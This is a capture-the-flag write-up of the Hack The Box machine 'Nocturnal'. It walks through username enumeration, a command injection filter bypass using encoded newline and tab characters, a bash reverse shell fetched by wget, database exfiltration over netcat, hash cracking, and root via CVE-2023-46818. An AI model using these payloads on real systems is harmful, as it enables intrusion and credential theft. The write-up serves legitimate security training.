---
title: Nocturnal - HTB
date: 2025-05-05 22:37:42 +0530
categories: [HTB, Linux]
tags: [htb,linux,easy]
---


---
## Overview
Nocturnal is an easy machine from Hack The Box. This is a Linux machine that focuses on Enumeration, Broken Access Control (OWASP Top 10 Web A01:2021), OS Command Injection (OWASP Top 10 Web A03:2021) and Privilege Escalation via Known Vulnerabilities and Exposure. 

---
- **OS:** Linux
- **Difficulty:** Easy
- **Link:** [Nocturnal - Hack The Box](https://app.hackthebox.com/machines/nocturnal)
- **Tools Used:** nmap, rustscan, Burp Suite, [ffuf](https://github.com/ffuf/ffuf), DB Browser for SQLite, sqlite3, hashcat, netcat, pwncat

---
## Enumeration
### Port Scan
The Enumeration process begins with Port Scan using RustScan. The command used is as follows - `rustscan --range=1-65535 -a nocturnal.htb -- -A`.
The open ports are:
```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDpf3JJv7Vr55+A/O4p/l+TRCtst7lttqsZHEA42U5Edkqx/Kb8c+F0A4wMCVOMqwyR/PaMdmzAomYGvNYhi3NelwIEqdKKnL+5svrsStqb9XjyShPD9SQK5Su7xBt+/TfJyJFRcsl7ZJdfc6xnNHQITvwa6uZhLsicycj0yf1Mwdzy9hsc8KRY2fhzARBaPUFdG0xte2MkaGXCBuI0tMHsqJpkeZ46MQJbH5oh4zqg2J8KW+m1suAC5toA9kaLgRis8p/wSiLYtsfYyLkOt2U+E+FZs4i3vhVxb9Sjl9QuuhKaGKQN2aKc8ItrK8dxpUbXfHr1Y48HtUejBj+AleMrUMBXQtjzWheSe/dKeZyq8EuCAzeEKdKs4C7ZJITVxEe8toy7jRmBrsDe4oYcQU2J76cvNZomU9VlRv/lkxO6+158WtxqHGTzvaGIZXijIWj62ZrgTS6IpdjP3Yx7KX6bCxpZQ3+jyYN1IdppOzDYRGMjhq5ybD4eI437q6CSL20=
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLcnMmaOpYYv5IoOYfwkaYqI9hP6MhgXCT9Cld1XLFLBhT+9SsJEpV6Ecv+d3A1mEOoFL4sbJlvrt2v5VoHcf4M=
|   256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIASsDOOb+I4J4vIK5Kz0oHmXjwRJMHNJjXKXKsW0z/dy
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Welcome to Nocturnal
| http-methods: 
|_  Supported Methods: GET HEAD POST

Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=4/28%OT=22%CT=%CU=36513%PV=Y%DS=2%DC=T%G=N%TM=680F3519
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=104%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11
OS:NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)
```
The port scan results indicate that the HTTP service running on port 80 is a likely target for gaining an initial foothold.

### Website
 The website shows a page detailing the features of cloud-storage application. Burp Suite is configured as a proxy, and all traffic to the target is routed through it. The web page has two buttons -  *login* and *register* for users to upload and view the files.
 An email address "support@nocturnal.htb" is displayed at the bottom of the page.
![Home Page](/assets/images/htb_nocturnal01.png){: w="700" h="400" }

Login and registration pages are available at (http://nocturnal.htb/login.php)[http://nocturnal.htb/login.php] and (http://nocturnal.htb/register.php)[http://nocturnal.htb/register.php] respectively, each containing a form with username and password fields.
![Registration Page](/assets/images/htb_nocturnal02.png){: w="700" h="400" }

After registering and logging in, a dashboard page is displayed at (http://nocturnal.htb/dashboard.php)[http://nocturnal.htb/dashboard.php]. It includes a file upload feature that allows users to upload and store files on the server. Uploaded files are listed on the dashboard, and clicking on any file link redirects to (http://nocturnal.htb/view.php?username=username&file=filename)[http://nocturnal.htb/view.php?username=username&file=filename], from where the file is downloaded to local storage.
![Dashboard](/assets/images/htb_nocturnal03.png){: w="700" h="400" }

---
## Exploitation
### Initial Foothold
The file upload feature only accepts files with the following extensions: *pdf*, *doc*, *docx*, *xls*, *xlsx*, and *odt*. The application validates uploads based solely on file extensions. An attempt was made to upload a reverse shell, but it was unsuccessful. Path traversal vulnerabilities were also tested, but those attempts were unsuccessful as well.
The link for downloading files includes 2 URL parameters named *username* and *file* . This information is used to enumerate usernames as the application sends a "User not found." message when the username is not registered.
![User Not found](/assets/images/htb_nocturnal04.png){: w="700" h="400" }

The web application sends a "File does not exist." message in the response if the username is registered and the server has no file with the provided filename.
![File does not exist](/assets/images/htb_nocturnal05.png){: w="700" h="400" }

Username enumeration is carried out using [ffuf](https://github.com/ffuf/ffuf) and a file named *names.txt* from [SecLists](https://github.com/danielmiessler/SecLists) . The session cookie is also incorporated as this works only when one has a session. The commands is - `ffuf -c -u "http://nocturnal.htb/view.php?username=FUZZ&file=.pdf" -H "Cookie: PHPSESSID=session_id_here" -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -ac -fr "User not found"`
![User Enumeration](/assets/images/htb_nocturnal06.png){: w="700" h="400" }

Username enumeration reveals three usernames. Each username is tested in the URL parameter, leading to the discovery that one of the users has an uploaded file available for download.
![Am Dashboard](/assets/images/htb_nocturnal07.png){: w="700" h="400" }

This file contains a password that, when used with one of the identified usernames, provides access to the application’s [Admin Panel](http://nocturnal.htb/admin.php). The Admin Panel displays the code files of the application along with the option to create an encrypted archive.
![Admin Panel](/assets/images/htb_nocturnal08.png){: w="700" h="400" }

A command injection vulnerability is observed in [*admin.php*](http://nocturnal.htb/admin.php?view=admin.php) where input from the *password* POST parameter is used in a `zip` command to create the archive using the *proc_open* function. The vulnerability exists due to Insufficient Input Sanitation of the *password* parameter, where only the following characters are blocked -';', '&', '|', '$', ' ', '`', '{', '}', '&&'
![Command Injection Code](/assets/images/htb_nocturnal09.png){: w="700" h="400" }

Since many characters are sanitized, the exploit is crafted using URL encoded values of **Line Feed** and **Tab**. The exploit to run the `id` command is as follows `%0Abash%09-c%09"id"`, which is sent in the *password* POST parameter using Burp Suite's Repeater.
![Command Injection](/assets/images/htb_nocturnal10.png){: w="700" h="400" }

A simple bash reverse shell is created as a payload and hosted on the attacking machine using Python's `http.server` module.
```bash
echo "bash -i >& /dev/tcp/listener_ip/listener_port 0>&1" > reverse.sh # Creating Reverse Shell
python -m http.server port # Starting HTTP Server
pwncat -nvl listener_port # Starting Listener

```

This payload is transferred and a reverse shell is obtained using the following exploits in the *password* POST parameter to obtain a reverse shell under the user **www-data** .
```html
%0Abash%09-c%09"wget%09server_ip:server_port/reverse.sh"
%0Abash%09-i%09"bash%09reverse.sh"

```

![Reverse Shell](/assets/images/htb_nocturnal11.png){: w="700" h="400" }

### User Flag
A database file named *nocturnal_database.db* with a relative path of *../nocturnal_database/* is mentioned in some of php code files of the application. As the web application is run as the user **www-data** from the */var/www/nocturnal.htb* folder, the fully qualified path of the database file is discovered to be */var/www/nocturnal_database/nocturnal_database.db* .
This file is transferred to the local machine using netcat by starting a listener on local machine with `nc -l -p listener_port -q 1 > nocturnal.db`. An then, the file is sent from the reverse shell using `cat /var/www/nocturnal_database/nocturnal_database.db | nc listener_ip istener_port` .
This file is opened and browsed using DB Browser for SQLite . This database stores credentials of the users in a table named "*user*s".
![Users Table](/assets/images/htb_nocturnal12.png){: w="700" h="400" }

The password for one of the users can be cracked using `hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt`, where *hashes.txt* contains all the hashes from the database file separated by new-line. The cracked password is used to logon to ssh and obtain the user flag.

---
## Privilege Escalation
LinPEAS is downloaded and run as the non-root user to check for Privilege Escalation paths. The LinPEAS output indicates an open localhost port 8080.
![Active Ports](/assets/images/htb_nocturnal13.png){: w="700" h="400" }

By connecting to this port from the target machine using `curl -Lvv http://127.0.0.1:8080`, it is observed that *ISPConfig Hosting Control Panel version 3.2* is running on that port.
![ISPConfig](/assets/images/htb_nocturnal14.png){: w="700" h="400" }

Searching "ispconfig 3.2 vulneranility" on Google leads to **CVE-2023-46818**, a PHP code injection vulnerability which can be exploited by an authenticated admin user. A PoC can be found at [CVE-2023-46818 Python Exploit](https://github.com/ajdumanhug/CVE-2023-46818) .

Port forwarding to the local machine is set up using the command `ssh <user>@nocturnal.htb -L 9090:127.0.0.1:8080` so that the ISPConfig service can be accessed through the local machine on port 9090. A Login page is displayed on accessing the ISPConfig service in the browser.
![IPSConfig](/assets/images/htb_nocturnal15.png){: w="700" h="400" }

A working set of credentials can be found using the previously obtained usernames and passwords, which logs with admin rights.
The previously found PoC is used with the credentials to obtain shell as root and obtain the root flag.

---
# References
- [CVE-2023-46818](https://nvd.nist.gov/vuln/detail/CVE-2023-46818)
- [CVE-2023-46818 Python Exploit](https://github.com/ajdumanhug/CVE-2023-46818)